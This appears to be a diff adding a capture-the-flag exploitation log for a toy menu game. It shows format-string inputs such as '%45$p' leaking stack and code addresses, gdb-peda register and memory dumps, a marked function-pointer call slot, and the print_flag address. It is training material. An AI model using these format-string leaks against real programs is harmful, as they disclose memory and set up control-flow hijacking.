@@ -1,0 +1,181 @@
+>> 0 
+Enter your player name: AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p
+Enter your player id number: 0
+0: Smuggler
+1: Bounty Hunter
+2: Droid
+Select your player class: 0
+Welcome to Starwars Galaxies 2: Empire's new groove
+pls buy the game so we can afford real devs and graphics
+
+0: Create player
+1: Play
+2: View player
+3: Exit
+
+>> 2
+AAAAAAAA,0x7fffffffdd48,(nil),0x7ffff7a99590,0x7,(nil),0x7ffff7dcf8c0,0x7fffffffdce0,0x4141414141414141,0x252c70252c70252c
+0
+66
+Smuggler
+Welcome to Starwars Galaxies 2: Empire's new groove
+pls buy the game so we can afford real devs and graphics
+
+0: Create player
+1: Play
+2: View player
+3: Exit
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffdce0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p")
+RBX: 0x0 
+RCX: 0x10 
+RDX: 0x55555555524a (<evade>:	push   rbp)
+RSI: 0x1 
+RDI: 0x7fffffffdce0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p")
+RBP: 0x7fffffffdcc0 --> 0x7fffffffdd70 --> 0x555555555700 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffdcb0 --> 0x7fffffffdd70 --> 0x555555555700 (<__libc_csu_init>:	push   r15)
+RIP: 0x5555555554ca (<play+20>:	mov    eax,0x0)
+R8 : 0x0 
+R9 : 0x0 
+R10: 0x7ffff7b80bc0 --> 0x2000200020002 
+R11: 0x555555556156 --> 0x69746167654e0000 ('')
+R12: 0x5555555550f0 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffde50 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5555555554be <play+8>:	mov    QWORD PTR [rbp-0x8],rdi
+   0x5555555554c2 <play+12>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x5555555554c6 <play+16>:	mov    rdx,QWORD PTR [rax+0x78]
+=> 0x5555555554ca <play+20>:	mov    eax,0x0
+   0x5555555554cf <play+25>:	call   rdx
+   0x5555555554d1 <play+27>:	nop
+   0x5555555554d2 <play+28>:	leave  
+   0x5555555554d3 <play+29>:	ret
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdcb0 --> 0x7fffffffdd70 --> 0x555555555700 (<__libc_csu_init>:	push   r15)
+0008| 0x7fffffffdcb8 --> 0x7fffffffdce0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p")
+0016| 0x7fffffffdcc0 --> 0x7fffffffdd70 --> 0x555555555700 (<__libc_csu_init>:	push   r15)
+0024| 0x7fffffffdcc8 --> 0x5555555556b9 (<main+251>:	jmp    0x5555555556ed <main+303>)
+0032| 0x7fffffffdcd0 --> 0xffffffff 
+0040| 0x7fffffffdcd8 --> 0x100000000 
+0048| 0x7fffffffdce0 ("AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p")
+0056| 0x7fffffffdce8 (",%p,%p,%p,%p,%p,%p,%p,%p,%p")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x00005555555554ca in play ()
+
+
+gdb-peda$ x/80gx 0x7fffffffdc00
+0x7fffffffdc00:	0x00007fffffffdc10	0xff63aeb782462e00
+0x7fffffffdc10:	0x00007fffffffde50	0x00007fffffffdcdc
+0x7fffffffdc20:	0x00007ffff7dcf8c0	0x0000000000000000
+0x7fffffffdc30:	0x0000000000000004	0x0000000000000000
+0x7fffffffdc40:	0x000055555555623e	0x00007ffff7dce760
+0x7fffffffdc50:	0x000000000000000a	0x000055555555623e
+0x7fffffffdc60:	0x00007ffff7dca2a0	0x0000000000000000
+0x7fffffffdc70:	0x0000000000000000	0x00007ffff7a6f3b3
+0x7fffffffdc80:	0x0000000000000007	0x00007ffff7dce760
+0x7fffffffdc90:	0x000055555555623e	0x00007ffff7a62b12
+0x7fffffffdca0:	0x72656c6767756d53	0x0000000000000000
+0x7fffffffdcb0:	0x00007fffffffdd70	0x00007fffffffdce0
+0x7fffffffdcc0:	0x00007fffffffdd70	0x00005555555556b9
+0x7fffffffdcd0:	0x00000000ffffffff	0x0000000100000000
+0x7fffffffdce0:	0x4141414141414141	0x252c70252c70252c
+0x7fffffffdcf0:	0x2c70252c70252c70	0x70252c70252c7025
+0x7fffffffdd00:	0x000000000070252c	0x0000000000000000
+0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd30:	0x0000000000000000	0x0000000000000000
+0x7fffffffdd40:	0x00007fff00000000	0x72656c6767756d53
+0x7fffffffdd50:	0x0000555555555700	0x000055555555524a <--- call rdx
+0x7fffffffdd60:	0x00007fffffff0000	0x0000000100000000
+0x7fffffffdd70:	0x0000555555555700	0x00007ffff7a03c87
+0x7fffffffdd80:	0x0000000000000001	0x00007fffffffde58
+gdb-peda$ p print_flag
+$8 = {<text variable, no debug info>} 0x5555555551d9 <print_flag>
+
+
+>> 0
+Enter your player name: %45$p
+Enter your player id number: 0
+0: Smuggler
+1: Bounty Hunter
+2: Droid
+Select your player class: 0
+Welcome to Starwars Galaxies 2: Empire's new groove
+pls buy the game so we can afford real devs and graphics
+
+0: Create player
+1: Play
+2: View player
+3: Exit
+
+>> 2
+0x55555555524a
+0
+66
+Smuggler
+
+
+>> 0
+Enter your player name: %51$p
+Enter your player id number: 0
+0: Smuggler
+1: Bounty Hunter
+2: Droid
+Select your player class: 0
+Welcome to Starwars Galaxies 2: Empire's new groove
+pls buy the game so we can afford real devs and graphics
+
+0: Create player
+1: Play
+2: View player
+3: Exit
+
+>> 2
+0x7fffffffde58
+0
+66
+
+
+>> 0
+Enter your player name: %45$p,%51$p
+Enter your player id number: 0
+0: Smuggler
+1: Bounty Hunter
+2: Droid
+Select your player class: 0
+Welcome to Starwars Galaxies 2: Empire's new groove
+pls buy the game so we can afford real devs and graphics
+
+0: Create player
+1: Play
+2: View player
+3: Exit
+
+>> 2
+0x55555555524a,0x7fffffffde58
+0
+
+
+>> 0
+Enter your player name: %45$p,%51$p
+Enter your player id number: 0
+0: Smuggler
+1: Bounty Hunter
+2: Droid
+Select your player class: 0
+Welcome to Starwars Galaxies 2: Empire's new groove
+pls buy the game so we can afford real devs and graphics
+
+0: Create player
+1: Play
+2: View player
+3: Exit
+
+>> 2
+0x56225d00b24a,0x7ffd11200498
